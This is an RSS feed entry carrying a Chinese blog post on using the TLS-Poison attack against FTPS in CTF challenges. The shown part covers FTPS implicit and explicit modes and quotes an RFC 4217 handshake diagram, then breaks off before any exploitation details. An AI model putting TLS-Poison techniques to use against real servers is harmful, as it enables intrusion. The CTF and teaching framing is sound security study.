<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <generator>NUAA</generator>
    <id>https://blogroll.a2os.club</id>
    <title>NUAARSS</title>
    <updated>2021-06-05T18:54:32+08:00</updated>
    <link href="https://blogroll.a2os.club"/>
    <author>
        <name>NUAARSS</name>
    </author>
    
    
    <entry>
        <id>https://blog.zeddyu.info/2021/05/19/tls-ctf/</id>
        <title><![CDATA[TLS-Poison 攻击方式在 CTF 中的利用实践]]></title>
        <updated>2021-06-01T02:31:38+08:00</updated>
        <link href="https://blog.zeddyu.info/2021/05/19/tls-ctf/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2021/05/19/tls-ctf/"><![CDATA[<html><head></head><body><p>&#x6700;&#x8FD1;&#x603B;&#x7ED3;&#x6574;&#x7406;&#x4E86; TLS Poison &#x653B;&#x51FB;&#x76F8;&#x5173;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x672C;&#x6587;&#x4F1A;&#x7EE7;&#x7EED;&#x8BB2; TLS Poison &#x5229;&#x7528;&#xFF0C;&#x4EE5;&#x53CA;&#x5176;&#x5728; CTF &#x7684;&#x5B9E;&#x9645;&#x8FD0;&#x7528;&#xFF0C;&#x4E5F;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x6765;&#x804A;&#x804A; FTPS &#x76F8;&#x5173;&#x77E5;&#x8BC6;&#x3002;</p><blockquote class="colorquote success"><p>&#x6587;&#x7AE0;&#x9996;&#x53D1;&#x4E8E;&#x957F;&#x4EAD;&#x5B89;&#x5168;&#x8BFE;&#x5802;&#xFF1A;TLS-Poison &#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x5728;&#x771F;&#x5B9E;CTF&#x8D5B;&#x9898;&#x4E2D;&#x7684;&#x5229;&#x7528;&#x5B9E;&#x8DF5; <a href="https://mp.weixin.qq.com/s/ZziSf69AOyXoI0IgC0UyUQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ZziSf69AOyXoI0IgC0UyUQ</a></p></blockquote><a id="more"></a><p><strong>PS: &#x5728;&#x9605;&#x8BFB;&#x672C;&#x6587;&#x4E4B;&#x524D;&#xFF0C;&#x5EFA;&#x8BAE;&#x60A8;&#x638C;&#x63E1;&#x76F8;&#x5173;&#x7684; TLS Poison &#x5148;&#x9A8C;&#x77E5;&#x8BC6;&#xFF0C;&#x672C;&#x6587;&#x4E0D;&#x4F1A;&#x518D;&#x91CD;&#x65B0;&#x8BE6;&#x7EC6;&#x4ECB;&#x7ECD; TLS Poison &#x653B;&#x51FB;&#x7684;&#x57FA;&#x7840;&#x77E5;&#x8BC6;</strong></p><p>&#x6211;&#x4EEC;&#x9996;&#x5148;&#x518D;&#x6765;&#x56DE;&#x987E; Black Hat &#x8FD9;&#x4E2A;&#x8BAE;&#x9898;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x4F5C;&#x8005;&#x4F7F;&#x7528;&#x7684;&#x662F; When TLS Hacks You &#x5462;&#xFF1F;&#x800C;&#x4E0D;&#x662F; When HTTPS Hack You &#xFF0C;&#x8BF4;&#x660E;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x662F;&#x51FA;&#x73B0;&#x5728; TLS &#x7279;&#x6027;&#x8EAB;&#x4E0A;&#xFF0C;&#x6240;&#x4EE5;&#x76EE;&#x524D;&#x6211;&#x4EEC;&#x8C8C;&#x4F3C;&#x90FD;&#x66F4;&#x591A;&#x53EA;&#x5C40;&#x9650;&#x5730;&#x4E13;&#x6CE8;&#x5728; HTTPS &#x4E0A;&#xFF0C;&#x8FD9;&#x662F;&#x6BD4;&#x8F83;&#x72ED;&#x9698;&#x7684;&#x8003;&#x8651;&#x3002;&#x65E2;&#x7136;&#x5982;&#x6B64;&#xFF0C;HTTPS &#x662F; HTTP over TLS &#xFF0C;&#x90A3;&#x5176;&#x4ED6;&#x534F;&#x8BAE;&#x662F;&#x4E0D;&#x662F;&#x4E5F;&#x53EF;&#x4EE5;&#x5462;&#xFF1F;&#x6BD4;&#x5982; FTPS &#xFF0C;FTP over TLS &#x7B49;&#x7B49;&#xFF1F;&#x90A3;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B; FTPS &#x53EF;&#x4EE5;&#x5982;&#x4F55;&#x4F7F;&#x7528;&#x3002;</p><h2 id="Introduction-of-FTPS"><a href="#Introduction-of-FTPS" class="headerlink" title="Introduction of FTPS"></a>Introduction of FTPS</h2><blockquote><p>&#x200B;    <strong>FTPS</strong> (also known <strong>FTP-SSL</strong>, and <em>FTP Secure</em>) is an extension to the commonly used <a href="https://en.wikipedia.org/wiki/File_Transfer_Protocol" target="_blank" rel="noopener">File Transfer Protocol</a> (FTP) that adds support for the <a href="https://en.wikipedia.org/wiki/Transport_Layer_Security" target="_blank" rel="noopener">Transport Layer Security</a> (TLS) and, formerly, the <a href="https://en.wikipedia.org/wiki/Secure_Sockets_Layer" target="_blank" rel="noopener">Secure Sockets Layer</a> (SSL, which is now prohibited by <a href="https://tools.ietf.org/html/rfc7568" target="_blank" rel="noopener">RFC7568</a>) cryptographic protocols.</p><p>FTPS should not be confused with the <a href="https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol" target="_blank" rel="noopener">SSH File Transfer Protocol</a> (SFTP), a secure file transfer subsystem for the <a href="https://en.wikipedia.org/wiki/Secure_Shell" target="_blank" rel="noopener">Secure Shell</a> (SSH) protocol with which it is not compatible. It is also different from <a href="https://en.wikipedia.org/wiki/FTP_over_SSH" target="_blank" rel="noopener">FTP over SSH</a>, which is the practice of tunneling FTP through an SSH connection.</p></blockquote><p>&#x9996;&#x5148;&#x7B80;&#x5355;&#x4ECB;&#x7ECD;&#x4E00;&#x4E0B; FTPS &#xFF0C;FTPS &#x662F;&#x4E00;&#x79CD;&#x5BF9;&#x5E38;&#x7528;&#x7684;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#x534F;&#x8BAE;&#xFF08;FTP&#xFF09;&#x6DFB;&#x52A0;&#x4F20;&#x8F93;&#x5C42;&#x5B89;&#x5168;&#xFF08;TLS&#xFF09;&#x548C;&#x5B89;&#x5168;&#x5957;&#x63A5;&#x5C42;&#xFF08;SSL&#xFF09;&#x52A0;&#x5BC6;&#x534F;&#x8BAE;&#x652F;&#x6301;&#x7684;&#x6269;&#x5C55;&#x534F;&#x8BAE;&#x3002;</p><p>&#x5728; HTTPS &#x6A2A;&#x7A7A;&#x51FA;&#x4E16;&#x4E4B;&#x540E;&#xFF0C;SSL &#x534F;&#x8BAE;&#x4E5F;&#x5E94;&#x7528;&#x5230;&#x4E86; FTP &#x4E0A;&#xFF0C;&#x968F;&#x540E;&#x5728; 1996 &#x53D1;&#x5E03;&#x4E86; FTPS &#x7684;&#x4E00;&#x4E2A;&#x8349;&#x6848; <a href="https://tools.ietf.org/id/draft-murray-auth-ftp-ssl-00.txt" target="_blank" rel="noopener">Secure FTP over SSL</a> &#xFF0C;&#x4F46;&#x662F;&#x76F4;&#x5230; 2005 &#x5E74;&#x624D;&#x6700;&#x7EC8;&#x786E;&#x5B9A;&#x7EC8;&#x7A3F; <a href="https://tools.ietf.org/html/rfc4217" target="_blank" rel="noopener">RFC 4217 - Securing FTP with TLS</a> &#x3002;&#x7136;&#x800C;&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;FTPS &#x62E5;&#x6709;&#x4E24;&#x79CD;&#x6A21;&#x5F0F;&#xFF0C;&#x8FD9;&#x91CC;&#x5E76;&#x975E;&#x6307;&#x7684;&#x662F; FTP &#x7684;&#x4E3B;&#x52A8;&#x3001;&#x88AB;&#x52A8;&#x6A21;&#x5F0F;&#xFF0C;&#x800C;&#x662F;&#x663E;&#x5F0F;&#x3001;&#x9690;&#x5F0F;&#x6A21;&#x5F0F;&#x3002;</p><h3 id="Implicit-Mode"><a href="#Implicit-Mode" class="headerlink" title="Implicit Mode"></a>Implicit Mode</h3><p>&#x5728;&#x9690;&#x5F0F;&#x6A21;&#x5F0F;&#x4E0B;&#xFF0C;FTPS &#x7684;&#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;&#x5728; 990 &#x7AEF;&#x53E3;&#x4E0A;&#xFF0C;&#x9690;&#x5F0F;&#x6A21;&#x5F0F;&#x4E0B;&#x6240;&#x6709;&#x7684;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5747;&#x4E3A;&#x52A0;&#x5BC6;&#x3002;</p><p>&#x5BA2;&#x6237;&#x7AEF;&#x5FC5;&#x987B;&#x5148;&#x4F7F;&#x7528; TLS Client Hello &#x6D88;&#x606F;&#x5411; FTPS &#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x63E1;&#x624B;&#x6765;&#x521B;&#x5EFA;&#x52A0;&#x5BC6;&#x8FDE;&#x63A5;&#xFF0C;&#x5982;&#x679C; FTPS &#x670D;&#x52A1;&#x5668;&#x672A;&#x6536;&#x5230;&#x6B64;&#x7C7B;&#x6D88;&#x606F;&#xFF0C;&#x5219;&#x670D;&#x52A1;&#x5668;&#x5E94;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;&#x3002; &#x4E3A;&#x4E86;&#x4FDD;&#x6301;&#x4E0E;&#x73B0;&#x6709;&#x7684;&#x975E; FTPS &#x611F;&#x77E5;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x517C;&#x5BB9;&#x6027;&#xFF0C;&#x9690;&#x5F0F; FTPS &#x9ED8;&#x8BA4;&#x5728; IANA &#x89C4;&#x5B9A;&#x7684;&#x7AEF;&#x53E3; 990/TCP &#x4E0A;&#x76D1;&#x542C; FTPS &#x63A7;&#x5236;&#x901A;&#x9053;&#xFF0C;&#x5E76;&#x5728;&#x7AEF;&#x53E3; 989/TCP &#x4E0A;&#x76D1;&#x542C; FTPS &#x6570;&#x636E;&#x901A;&#x9053;&#x3002;&#x8FD9;&#x4F7F;&#x5F97;&#x7BA1;&#x7406;&#x5458;&#x53EF;&#x4EE5;&#x4FDD;&#x7559;&#x7AEF;&#x53E3;(&#x63A7;&#x5236;&#x901A;&#x9053; 21/TCP &#x4E0E;&#x6570;&#x636E;&#x901A;&#x9053; 20/TCP )&#x4EE5;&#x517C;&#x5BB9;&#x539F;&#x59CB;&#x7684;FTP&#x3002;</p><p>&#x867D;&#x7136;&#x6211;&#x6CA1;&#x6709;&#x67E5;&#x627E;&#x5230;&#x9690;&#x5F0F; FTPS &#x7684;&#x76F8;&#x5173;&#x5386;&#x53F2;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4E2A;&#x4EBA;&#x89C9;&#x5F97;&#x4ED6;&#x66F4;&#x50CF;&#x5728; SSL &#x65F6;&#x4EE3;&#x5E94;&#x8FD0;&#x800C;&#x751F;&#x7684;&#x4EA7;&#x7269;&#xFF0C;&#x66F4;&#x7B26;&#x5408;&#x4E86; FTP over SSL &#x7684;&#x610F;&#x601D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x4E00;&#x5F00;&#x59CB;&#x4F7F;&#x7528; TLS/SSL &#x8FDB;&#x884C;&#x4F1A;&#x8BDD;&#x521B;&#x5EFA;&#xFF0C;&#x518D;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x52A0;&#x5BC6;&#x4F20;&#x8F93;&#x3002;&#x4F46; RFC 4217 &#x4E2D;&#x672A;&#x5B9A;&#x4E49;&#x9690;&#x5F0F;&#x6A21;&#x5F0F;&#xFF0C;&#x56E0;&#x6B64;&#x5B83;&#x4E5F;&#x88AB;&#x8BA4;&#x4E3A;&#x662F;FTP&#x534F;&#x5546;TLS/SSL&#x4E2D;&#x8FC7;&#x65F6;&#x7684;&#x65E9;&#x671F;&#x65B9;&#x6CD5;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://www.sftpplus.de/static/images/4608-ImplicitFTPS.png" alt></p><h3 id="Explicit-Mode"><a href="#Explicit-Mode" class="headerlink" title="Explicit Mode"></a>Explicit Mode</h3><p>&#x5728;&#x663E;&#x5F0F;&#x6A21;&#x5F0F;&#xFF08;&#x4E5F;&#x79F0;&#x4E3A;FTPES&#xFF09;&#x4E0B;&#xFF0C;FTPS &#x5BA2;&#x6237;&#x7AEF;&#x5148;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x521B;&#x5EFA;&#x660E;&#x6587;&#x8FDE;&#x63A5;&#xFF0C;&#x7136;&#x540E;&#x4ECE;&#x63A7;&#x5236;&#x901A;&#x9053;&#x660E;&#x786E;&#x8BF7;&#x6C42;&#x670D;&#x52A1;&#x7AEF;&#x5347;&#x7EA7;&#x4E3A;&#x52A0;&#x5BC6;&#x8FDE;&#x63A5;&#xFF08;&#x547D;&#x4EE4;&#x4E3A;: AUTH TLS&#xFF09;&#x3002;&#x63A7;&#x5236;&#x901A;&#x9053;&#x4E0E;&#x6570;&#x636E;&#x901A;&#x9053;&#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;&#x4E0E;&#x539F;&#x59CB; FTP &#x4E00;&#x6837;&#x4E5F;&#x662F; 21 &#x7AEF;&#x53E3;&#x3002;&#x63A7;&#x5236;&#x901A;&#x9053;&#x59CB;&#x7EC8;&#x52A0;&#x5BC6;&#xFF0C;&#x800C;&#x6570;&#x636E;&#x901A;&#x9053;&#x662F;&#x5426;&#x52A0;&#x5BC6;&#x5219;&#x4E3A;&#x53EF;&#x9009;&#x9879;&#x3002; &#x540C;&#x65F6;&#x82E5;&#x670D;&#x52A1;&#x5668;&#x672A;&#x9650;&#x5236;&#x660E;&#x6587;&#x8FDE;&#x63A5;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x672A;&#x52A0;&#x5BC6;&#x7684;&#x539F;&#x59CB; FTP &#x8FDB;&#x884C;&#x8FDE;&#x63A5;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x670D;&#x52A1;&#x5668;&#x5728;&#x76F8;&#x540C;&#x7684;&#x7AEF;&#x53E3;&#x4E0A;&#x540C;&#x65F6;&#x63D0;&#x4F9B; FTP &#x4E0E; FTPS &#x670D;&#x52A1;&#x3002;</p><p>&#x4E0E;FTP&#x534F;&#x5546;&#x8BA4;&#x8BC1;&#x548C;&#x5B89;&#x5168;&#x7684;&#x673A;&#x5236;&#x662F;&#x5728; RFC 2228 &#x4E0B;&#x589E;&#x52A0;&#x7684;&#xFF0C;&#x5176;&#x4E2D;&#x5305;&#x62EC;&#x65B0;&#x7684; FTP &#x547D;&#x4EE4; AUTH &#x3002;&#x867D;&#x7136;&#x8BE5; RFC &#x6CA1;&#x6709;&#x660E;&#x786E;&#x5B9A;&#x4E49;&#x4EFB;&#x4F55;&#x6240;&#x9700;&#x7684;&#x5B89;&#x5168;&#x673A;&#x5236;&#xFF0C;&#x5982; SSL &#x6216; TLS &#xFF0C;&#x4F46;&#x5B83;&#x786E;&#x5B9E;&#x8981;&#x6C42; FTPS &#x5BA2;&#x6237;&#x7AEF;&#x7528;&#x4E00;&#x4E2A;&#x53CC;&#x65B9;&#x90FD;&#x77E5;&#x9053;&#x7684;&#x673A;&#x5236;&#x6311;&#x6218; FTPS &#x670D;&#x52A1;&#x5668;&#x3002;&#x5982;&#x679C; FTPS &#x5BA2;&#x6237;&#x7AEF;&#x7528;&#x4E00;&#x4E2A;&#x672A;&#x77E5;&#x7684;&#x5B89;&#x5168;&#x673A;&#x5236;&#x6311;&#x6218; FTPS &#x670D;&#x52A1;&#x5668;&#xFF0C; FTPS &#x670D;&#x52A1;&#x5668;&#x5C06;&#x4EE5;&#x9519;&#x8BEF;&#x4EE3;&#x7801; 504&#xFF08;&#x4E0D;&#x652F;&#x6301;&#xFF09;&#x54CD;&#x5E94; AUTH &#x547D;&#x4EE4;&#x3002;&#x5BA2;&#x6237;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4F7F;&#x7528; FEAT &#x547D;&#x4EE4;&#x67E5;&#x8BE2; FTPS &#x670D;&#x52A1;&#x5668;&#x6765;&#x786E;&#x5B9A;&#x652F;&#x6301;&#x54EA;&#x4E9B;&#x673A;&#x5236;&#xFF0C;&#x5C3D;&#x7BA1;&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x4E00;&#x5B9A;&#x9700;&#x8981;&#x8BDA;&#x5B9E;&#x5730;&#x62AB;&#x9732;&#x5B83;&#x4EEC;&#x652F;&#x6301;&#x54EA;&#x4E9B;&#x5B89;&#x5168;&#x7EA7;&#x522B;&#x3002;&#x8C03;&#x7528; FTPS &#x5B89;&#x5168;&#x7684;&#x5E38;&#x89C1;&#x65B9;&#x6CD5;&#x5305;&#x62EC; AUTH TLS &#x548C; AUTH SSL &#x3002;&#x663E;&#x5F0F;&#x65B9;&#x6CD5;&#x5728; RFC 4217 &#x4E2D;&#x5B9A;&#x4E49;&#x540E;&#xFF0C;FTPS&#x7684;&#x5408;&#x89C4;&#x6027;&#x8981;&#x6C42;&#x5BA2;&#x6237;&#x7AEF;&#x59CB;&#x7EC8;&#x4F7F;&#x7528; AUTH TLS &#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x534F;&#x5546;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://www.sftpplus.de/static/images/4608-ExplicitFTPS.png" alt></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728; RFC 4217 &#x4E2D;&#x627E;&#x5230;&#x663E;&#x5F0F; FTPS &#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x65B9;&#x5F0F;&#xFF1A;</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">          <span class="hljs-built_in"> Client </span>                                Server</span><br><span class="line">  control          data                   data               control</span><br><span class="line">====================================================================</span><br><span class="line"></span><br><span class="line">                                                             socket()</span><br><span class="line">                                                             bind()</span><br><span class="line">  socket()</span><br><span class="line">  connect()  ----------------------------------------------&gt; accept()</span><br><span class="line">            &lt;----------------------------------------------  220</span><br><span class="line">  AUTH TLS   ----------------------------------------------&gt;</span><br><span class="line">            &lt;----------------------------------------------  234</span><br><span class="line">  TLSneg()  &lt;----------------------------------------------&gt; TLSneg()</span><br><span class="line">  PBSZ 0     ----------------------------------------------&gt;</span><br><span class="line">            &lt;----------------------------------------------  200</span><br><span class="line">  PROT P     ----------------------------------------------&gt;</span><br><span class="line">            &lt;----------------------------------------------  200</span><br><span class="line"> <span class="hljs-built_in"> USER </span>fred  ----------------------------------------------&gt;</span><br><span class="line">            &lt;----------------------------------------------  331</span><br><span class="line">  PASS pass  ----------------------------------------------&gt;</span><br><span class="line">            &lt;----------------------------------------------  230</span><br><span class="line"></span><br><span class="line">Note 1: The order of the PBSZ/PROT pair <span class="hljs-keyword">and</span> the USER/PASS pair (with</span><br><span class="line">respect <span class="hljs-keyword">to</span> each other) is <span class="hljs-keyword">not</span> important (i.e., the USER/PASS can</span><br><span class="line">happen prior <span class="hljs-keyword">to</span> the PBSZ/PROT, <span class="hljs-keyword">or</span> the<span class="hljs-built_in"> server </span>can refuse <span class="hljs-keyword">to</span> allow a</span><br><span class="line">PBSZ/PROT pair until the USER/PASS pair has happened).</span><br><span class="line"></span><br><span class="line">Note 2: The PASS command might <span class="hljs-keyword">not</span> be required at all (<span class="hljs-keyword">if</span> the USER</span><br><span class="line">parameter <span class="hljs-keyword">and</span> any<span class="hljs-built_in"> client identity </span>presented provide sufficient</span><br><span class="line">authentication).  The<span class="hljs-built_in"> server </span>would indicate this by issuing a <span class="hljs-string">&apos;232&apos;</span></span><br><span class="line">reply <span class="hljs-keyword">to</span> the<span class="hljs-built_in"> USER </span>command instead of the <span class="hljs-string">&apos;331&apos;</span>, which requests a PASS</span><br><span class="line"><span class="hljs-keyword">from</span> the<span class="hljs-built_in"> client </span>(see below).</span><br><span class="line"></span><br><span class="line">Note 3: The AUTH command might <span class="hljs-keyword">not</span> be the first command after the</span><br><span class="line">receipt of the 220 welcome message.</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6570;&#x636E;&#x4F20;&#x8F93;&#x9636;&#x6BB5;&#xFF1A;</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 